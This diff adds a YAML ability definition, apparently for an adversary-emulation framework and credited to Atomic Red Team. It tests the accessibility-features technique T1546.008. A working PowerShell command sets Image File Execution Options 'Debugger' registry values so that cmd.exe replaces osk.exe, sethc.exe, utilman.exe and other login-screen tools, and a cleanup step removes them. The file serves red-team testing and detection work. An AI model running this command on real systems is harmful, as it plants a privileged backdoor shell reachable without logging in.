@@ -1,0 +1,57 @@
+- id: 3309f53e-b22b-4eb6-8fd2-a6cf58b355a9
+  name: Attaches Command Prompt as a Debugger to a List of Target Processes
+  description: 'Attaches cmd.exe to a list of processes. Configure your own Input
+    arguments to a different executable or list of executables.
+
+    Upon successful execution, powershell will modify the registry and swap osk.exe
+    with cmd.exe.'
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1546.008
+    name: 'Event Triggered Execution: Accessibility Features'
+  platforms:
+    windows:
+      psh:
+        command: $input_table = "osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe,
+          DisplaySwitch.exe, atbroker.exe".split(","); $Name = "Debugger"; $Value
+          = "C:\windows\system32\cmd.exe"; Foreach ($item in $input_table){; $item
+          = $item.trim(); $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
+          File Execution Options\$item"; IF(!(Test-Path $registryPath)); {; New-Item
+          -Path $registryPath -Force; New-ItemProperty -Path $registryPath -Name $name
+          -Value $Value -PropertyType STRING -Force; }; ELSE; {; New-ItemProperty
+          -Path $registryPath -Name $name -Value $Value; }; }
+        cleanup: $input_table = "#{parent_list}".split(","); Foreach ($item in $input_table);
+          {; $item = $item.trim(); reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\Image File Execution Options\$item" /v Debugger /f 2>&1
+          | Out-Null; }
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - privilege-escalation
+  - t1546.008
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      parent_list:
+        description: 'Comma separated list of system binaries to which you want to
+          attach each #{attached_process}. Default: "osk.exe"
+
+          '
+        type: string
+        default: osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe,
+          atbroker.exe
+      attached_process:
+        description: 'Full path to process to attach to target in #{parent_list}.
+          Default: cmd.exe
+
+          '
+        type: path
+        default: C:\windows\system32\cmd.exe
+    technique_created: '2020-01-24T14:32:40.315Z'
+    atomic_guid: 3309f53e-b22b-4eb6-8fd2-a6cf58b355a9
+    import_timestamp: '2025-06-24T11:15:02.115043Z'
